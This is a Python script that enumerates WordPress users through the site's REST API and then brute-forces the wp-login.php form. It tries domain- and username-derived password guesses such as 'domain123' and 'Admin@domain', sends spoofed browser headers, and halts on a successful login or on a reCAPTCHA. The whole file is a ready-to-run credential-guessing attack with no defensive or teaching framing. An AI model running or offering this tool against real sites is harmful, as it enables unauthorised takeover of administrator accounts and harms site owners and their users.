import re
import sys
import requests

def generate_passwords(domain, remove_tld=True):
    # Remove protocol if present
    domain = re.sub(r'^https?://', '', domain)

    # Remove "www." prefix if present
    domain = re.sub(r'^www\.', '', domain)

    # Remove any file path at the end
    domain = domain.split('/')[0]

    # Remove subdomains and TLD, keeping only the SLD
    if remove_tld:
        domain_parts = domain.split('.')
        if len(domain_parts) >= 2:
            domain = domain_parts[-2]

    # Generate possible passwords
    passwords = []
    passwords.append(domain)
    passwords.append(domain + '123')
    passwords.append(domain + '1234')
    passwords.append(domain + '123456')
    passwords.append(domain + '123456789')
    passwords.append(domain + '@123')
    passwords.append(domain + '!123')
    passwords.append(domain + '123@')
    passwords.append(domain + '123!')
    passwords.append(domain + '123456@')
    passwords.append(domain + '123456!')
    passwords.append(domain.capitalize() + '123')
    passwords.append(domain.capitalize() + '1234')
    passwords.append(domain.capitalize() + '123456')
    passwords.append(domain.capitalize() + '123456789')
    passwords.append(domain.capitalize() + '@123')
    passwords.append(domain.capitalize() + '!123')
    passwords.append(domain.capitalize() + '123@')
    passwords.append(domain.capitalize() + '123!')
    passwords.append(domain.capitalize() + '123456@')
    passwords.append(domain.capitalize() + '123456!')
    passwords.append('Admin' + domain)
    passwords.append('Password' + domain)
    passwords.append('Pass' + domain)
    passwords.append('123' + domain)
    passwords.append('!@#' + domain)
    passwords.append('qazwsx' + domain)
    passwords.append('Qwerty' + domain)
    passwords.append(domain + '2023')
    passwords.append(domain + '@2023')
    passwords.append(domain.capitalize() + '2023')
    passwords.append(domain.capitalize() + '@2023')
    passwords.append('Admin' + domain + '123')
    passwords.append('Password' + domain + '123')
    passwords.append('Admin@' + domain)
    passwords.append('Password@' + domain)
    passwords.append('123' + domain + '123')
    passwords.append('123@' + domain)
    passwords.append(domain + '#' + '123')
    passwords.append(domain.capitalize() + '#' + '123')
    passwords.append('Super' + domain)
    passwords.append(domain + '321')
    passwords.append(domain + '123321')
    passwords.append(domain + '!@#$')
    passwords.append(domain + 'abcd')
    passwords.append('12345678' + domain)
    passwords.append('admin123' + domain)
    passwords.append('password123' + domain)

    return passwords

def check_wordpress_usernames(domain):
    # Set up the REST API endpoint
    api_url = f"https://{domain}/wp-json/wp/v2/users"

    # Set the initial values for page and per_page
    page = 1
    per_page = 100

    usernames = []  # Initialize the list to store usernames

    # Generate passwords to test
    passwords = generate_passwords(domain)

    # Create a session object
    session = requests.Session()
    
    try:
        while True:
            # Make a request to the API with the current page and per_page values
            response = session.get(api_url, params={"page": page, "per_page": per_page})

            # Check if the request was successful
            response.raise_for_status()

            # Parse the response JSON
            data = response.json()

            # Break the loop if no more data is returned
            if not data:
                break

            # Extract the usernames from the response
            for user in data:
                usernames.append(user["name"])

            # Move to the next page
            page += 1

        # Check if any usernames are found
        if usernames:
            print("WordPress usernames found:")
            for username in usernames:
                print(username)
                
                # Generate passwords based on username and add to the list
                passwords += generate_passwords(username, remove_tld=False)

                # Test all passwords for each username
                for password in passwords:
                    post_data = {
                        "log": username,
                        "pwd": password,
                        "wp-submit": "Log In",
                        "redirect_to": f"https://{domain}/wp-admin/",
                        "testcookie": "1"
                    }

                    headers = {
                        "Host": domain,
                        "Cookie": "wordpress_test_cookie=WP%20Cookie%20check;",
                        "Content-Length": str(len(post_data)),
                        "Cache-Control": "max-age=0",
                        "Sec-Ch-Ua": '"Chromium";v="105", "Not)A;Brand";v="8"',
                        "Sec-Ch-Ua-Mobile": "?0",
                        "Sec-Ch-Ua-Platform": '"Linux"',
                        "Upgrade-Insecure-Requests": "1",
                        "Origin": f"https://{domain}",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Sec-Fetch-Site": "same-origin",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-User": "?1",
                        "Sec-Fetch-Dest": "document",
                        "Referer": f"https://{domain}/wp-login.php",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "en-US,en;q=0.9"
                    }

                    post_response = session.post(f"https://{domain}/wp-login.php", data=post_data, headers=headers)

                    # Check if the response contains the password error message
                    if "The password you entered for the username" in post_response.text:
                        print(f"Incorrect password '{password}' found for username: {username}")
                    elif "ce mot de passe ne correspond" in post_response.text:
                        print(f"Incorrect password '{password}' found for username: {username}")
                    elif "The reCAPTCHA wasn't entered correctly. Please try again." in post_response.text:
                        print(f"Stopping script as website has captcha enabled")
                        sys.exit()
                    # Now you can check the final URL after all redirects
                    elif post_response.url == f"https://{domain}/wp-admin/":
                        print(f"Username: {username} - Password '{password}' is correct")
                        sys.exit()
                    else:
                        print("Couldn't correctly identify if the request worked.. moving on")
                        print("Status code:", post_response.status_code)
                        print("Response text:", post_response.text[:500])  # print the first 500 characters of the response text
                    

        else:
            print("No WordPress usernames found.")

    except requests.exceptions.RequestException as e:
        print(f"Failed to retrieve user data for {domain}. Error: {e}")

# Call the function with your desired domain
check_wordpress_usernames("example.com")
